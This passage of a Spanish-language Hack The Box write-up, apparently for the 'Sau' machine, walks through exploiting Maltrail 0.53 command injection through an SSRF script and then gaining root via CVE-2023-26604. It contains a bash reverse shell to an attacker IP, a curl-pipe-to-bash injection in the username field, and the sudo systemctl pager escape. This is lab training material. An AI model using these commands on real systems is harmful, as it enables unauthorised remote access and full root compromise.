<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span>HTTP/1.1 200 OK</span></span>
<span class="line"><span>Cache-Control: no-cache</span></span>
<span class="line"><span>Connection: close</span></span>
<span class="line"><span>Content-Security-Policy: default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; img-src * blob:; script-src &#39;self&#39; &#39;unsafe-eval&#39; https://stat.ripe.net; frame-src *; object-src &#39;none&#39;; block-all-mixed-content;</span></span>
<span class="line"><span>Content-Type: text/html</span></span>
<span class="line"><span>Date: Thu, 28 Dec 2023 08:44:05 GMT</span></span>
<span class="line"><span>Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT</span></span>
<span class="line"><span>Server: Maltrail/0.53</span></span>
<span class="line"><span>Transfer-Encoding: chunked</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!DOCTYPE html&gt;</span></span>
<span class="line"><span>...</span></span></code></pre> 
<p>Se encontró una huella digital de software en el encabezado HTTP «Servidor» con el valor «Maltrail/0.53». Hemos buscado en la web vulnerabilidades que afecten a esta versión y hemos encontrado un fallo de inyección de comandos del sistema operativo divulgado aquí.</p>
<blockquote>
<p>Description</p>
</blockquote>
<blockquote>
<p>Maltrail <code>&lt;= v0.54 is vulnerable to unauthenticated OS command injection during the login process.** Summary</code></p>
</blockquote>
<blockquote>
<p>[…] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication. Proof of Concept</p>
</blockquote>
<blockquote>
<p><code>curl ‘http://hostname:8338/login’ —data ‘username=;id &gt; /tmp/bbq’</code></p>
</blockquote>
<p>Parece que la versión instalada puede ser explotada a través del parámetro nombre de usuario en el endpoint de login en <a href="http://localhost/login">http://localhost/login</a>, al que se puede acceder con el script SSRF. Iniciamos una escucha PwnCat y procedimos a ejecutar un simple shell inverso bash descargado a través de HTTP.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Start PwnCat listener</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.2</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Change to your assigned VPN IP address</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">pwncat-cs</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -l</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8443</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Install: `python3 -m pip install pwncat-cs`</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># [In another session] Serve reverse shell over HTTP</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.2</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Change to your assigned VPN IP address</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./http-share</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">bash -i &gt;&amp; /dev/tcp/</span><span style="color:#999999;--shiki-dark:#89DDFF">${</span><span style="color:#B56959;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">}</span><span style="color:#B56959;--shiki-dark:#C3E88D">/8443 &lt;&amp;1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http-share/index.html</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http-server</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./http-share</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8080</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -a</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Install: `npm install -g http-server`</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># [In another session] Trigger command execution</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.2</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # Change to your assigned VPN IP address</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">zsh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ssrf.zsh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://localhost:80/login</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -i</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">username=</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\`</span><span style="color:#B56959;--shiki-dark:#C3E88D">curl </span><span style="color:#999999;--shiki-dark:#89DDFF">${</span><span style="color:#B56959;--shiki-dark:#BABED8">lhost</span><span style="color:#999999;--shiki-dark:#89DDFF">}</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080|bash</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\`</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Con la ejecución como el usuario puma, Encontramos una política sudo personalizada que nos permite ejecutar un comando en particular como cualquier usuario sin la contraseña de puma.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Display sudo policy</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -l</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Matching</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Defaults</span><span style="color:#B56959;--shiki-dark:#C3E88D"> entries</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#B56959;--shiki-dark:#C3E88D"> puma</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sau:</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    env_reset,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> mail_badpass,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> secure_path=/usr/local/sbin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/usr/local/bin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/usr/sbin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/usr/bin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/sbin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/bin</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\:</span><span style="color:#B56959;--shiki-dark:#C3E88D">/snap/bin</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">User</span><span style="color:#B56959;--shiki-dark:#C3E88D"> puma</span><span style="color:#B56959;--shiki-dark:#C3E88D"> may</span><span style="color:#B56959;--shiki-dark:#C3E88D"> run</span><span style="color:#B56959;--shiki-dark:#C3E88D"> the</span><span style="color:#B56959;--shiki-dark:#C3E88D"> following</span><span style="color:#B56959;--shiki-dark:#C3E88D"> commands</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sau:</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">    (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">ALL</span><span style="color:#B56959;--shiki-dark:#C3E88D"> :</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ALL</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> NOPASSWD:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/systemctl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> status</span><span style="color:#B56959;--shiki-dark:#C3E88D"> trail.service</span></span></code></pre> 
<h2 id="cve-2023-26604">CVE-2023-26604</h2>
<p>El comando que podemos ejecutar en un contexto privilegiado es /usr/bin/systemctl status trail.service. Después de buscar en la web vulnerabilidades conocidas en systemd/systemctl, se encontró una CVE de escalada de privilegios bastante reciente rastreada como CVE-2023-26604.</p>
<blockquote>
<p>systemd before 247 no bloquea adecuadamente la escalada de privilegios local para algunas configuraciones Sudo, por ejemplo, archivos sudoers plausibles en los que se puede ejecutar el comando «systemctl status». Específicamente, systemd no establece LESSSECURE a 1, y por lo tanto otros programas pueden ser lanzados desde el programa less. Esto presenta un riesgo de seguridad sustancial cuando se ejecuta systemctl desde Sudo, porque less se ejecuta como root cuando el tamaño de la terminal es demasiado pequeño para mostrar la salida completa de systemctl.</p>
</blockquote>
<p>Comprobamos la versión de systemd y nos dimos cuenta de que estaba instalada la versión vulnerable systemd 245.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Check if systemd version is vulnerable</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/bin/systemctl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --version</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">systemd</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 245</span><span style="color:#393A34;--shiki-dark:#BABED8"> (245.4-4ubuntu3.22)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">+PAM</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +AUDIT</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +SELINUX</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +IMA</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +APPARMOR</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +SMACK</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +SYSVINIT</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +UTMP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +LIBCRYPTSETUP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +GCRYPT</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +GNUTLS</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +ACL</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +XZ</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +LZ4</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +SECCOMP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +BLKID</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +ELFUTILS</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +KMOD</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +IDN2</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -IDN</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +PCRE2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> default-hierarchy=hybrid</span></span></code></pre> 
<p>Exploitation</p>
<p>Para explotar la CVE-2023-26604, se bajó la altura del terminal como se describe en la descripción de la CVE, y se ejecutó el comando sudo permitido. Desde el paginador simplemente introdujimos !sh para generar un shell de root.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># execute systemctl with lower resolution to spawn pager</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">stty</span><span style="color:#B56959;--shiki-dark:#C3E88D"> rows</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> systemctl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> status</span><span style="color:#B56959;--shiki-dark:#C3E88D"> trail.service</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">!</span><span style="color:#59873A;--shiki-dark:#FFCB6B">sh</span></span></code></pre> 
<p>Root !</p> </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.QlzOxquK_12zkJG.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Broker - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/broker/"> Broker - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.R-ZwdRw5_Z1hxbOg.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Crafty - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/crafty/"> Crafty - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.262ecYt-_1fWT2n.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Devvortex - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/devvortex/"> Devvortex - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Fullaw4ke. All rights reserved.
</footer> </main>    </body> </html> 